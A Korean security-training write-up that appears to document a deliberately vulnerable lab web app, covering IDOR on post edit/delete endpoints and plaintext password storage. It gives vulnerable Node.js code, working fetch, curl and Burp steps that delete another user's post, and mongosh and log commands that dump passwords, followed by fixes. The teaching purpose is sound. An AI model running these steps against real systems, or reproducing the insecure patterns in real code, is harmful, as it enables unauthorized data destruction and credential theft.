# #03 IDOR  ·  #04 Plaintext Password Storage

**OWASP** A01 Broken Access Control / A02 Cryptographic Failures  ·  **난이도** ⭐⭐ / ⭐

---

## #03 — IDOR (Insecure Direct Object Reference)

### 취약점 원인

게시글 수정(PUT)·삭제(DELETE) API가 **소유권을 검사하지 않습니다.**
로그인된 사용자라면 누구든 타인의 게시글 ID를 직접 지정해 수정하거나 삭제할 수 있습니다.

**`backend/routes/board.js` — 101~131번째 줄**
```js
router.put('/:id', authMiddleware, async (req, res) => {
    const post = await ProductPost.findById(req.params.id);
    // ❌ 소유권 검사 없음 — req.user.id와 post.author 비교 없음
    post.title = req.body.title;
    await post.save();
});

router.delete('/:id', authMiddleware, async (req, res) => {
    const post = await ProductPost.findById(req.params.id);
    // ❌ 소유권 검사 없음
    await ProductPost.deleteOne({ _id: post._id });
});
```

---

### 공격 실습

**준비** — 피해자(계정A) 게시글의 ID 확인
```
https://localhost:55173/board/68150abc1234def567890000
                               ↑ 이 부분이 게시글 ID
```

**방법 1 — DevTools Console** (계정B로 로그인된 상태)
```js
fetch('/api/board/68150abc1234def567890000', {
  method: 'DELETE',
  headers: { 'Authorization': 'Bearer ' + localStorage.getItem('token') }
}).then(r => r.json()).then(console.log);
// → { message: 'Post deleted' }  ← 타인 게시글 삭제 성공
```

**방법 2 — curl**
```bash
curl -k -X DELETE https://192.168.1.20:5000/api/board/<피해자_게시글_ID> \
  -H "Authorization: Bearer <계정B_토큰>"
```

**방법 3 — Burp Suite Repeater**
1. 자신의 게시글 수정/삭제 요청 캡처
2. Repeater로 전송 → URL의 ID를 피해자 게시글 ID로 교체
3. Send → `200 OK` 확인

---

### 방어

```js
router.delete('/:id', authMiddleware, async (req, res) => {
    const post = await ProductPost.findById(req.params.id);
    if (!post) return res.status(404).json({ message: 'Post not found' });

    // ✅ 소유권 검사 추가
    if (post.author.toString() !== req.user.id) {
        return res.status(403).json({ message: 'Forbidden' });
    }

    await ProductPost.deleteOne({ _id: post._id });
    res.json({ message: 'Post deleted' });
});
```

---
---

## #04 — Plaintext Password Storage

### 취약점 원인

비밀번호가 bcrypt 없이 **평문 그대로** MongoDB에 저장됩니다.
서버 로그에도 비밀번호가 출력됩니다.

**`backend/routes/auth.js` — 37, 73번째 줄**
```js
// 회원가입 — 해싱 없이 저장
const newUser = new User({ userId, password, securityAnswer });

// 로그인 — 평문 비교 + 로그 출력
console.log(`[DEBUG] Comparing passwords: [${password}] with [${user.password}]`);
if (password !== user.password) { ... }
```

---

### 공격 실습

**방법 1 — MongoDB Compass**

`mongodb://192.168.1.20:27017` 접속 → `market_db` → `users` 컬렉션

```json
{
  "userId": "alice",
  "password": "mypassword123",   ← 평문 그대로
  "securityAnswer": "고양이",
  "role": "User"
}
```

**방법 2 — Docker 로그 실시간 감시**
```bash
docker logs market_backend -f
```
다른 사용자가 로그인하는 순간:
```
[DEBUG] Comparing passwords: [mypassword123] with [mypassword123]
```

**방법 3 — mongosh 직접 쿼리**
```bash
docker exec -it market_mongodb mongosh
use market_db
db.users.find({}, { userId: 1, password: 1, _id: 0 })
```
```
[{ userId: 'admin', password: 'admin' }, { userId: 'alice', password: 'mypassword123' }]
```

**영향** — DB 접근 권한만 있으면 전체 사용자 비밀번호 즉시 획득 → 크리덴셜 스터핑 공격으로 연계 가능

---

### 방어

```js
const bcrypt = require('bcrypt');

// 회원가입
const hashedPassword = await bcrypt.hash(password, 10);
const newUser = new User({ userId, password: hashedPassword, securityAnswer });

// 로그인
const isMatch = await bcrypt.compare(password, user.password);
if (!isMatch) return res.status(400).json({ message: 'Invalid credentials' });
```
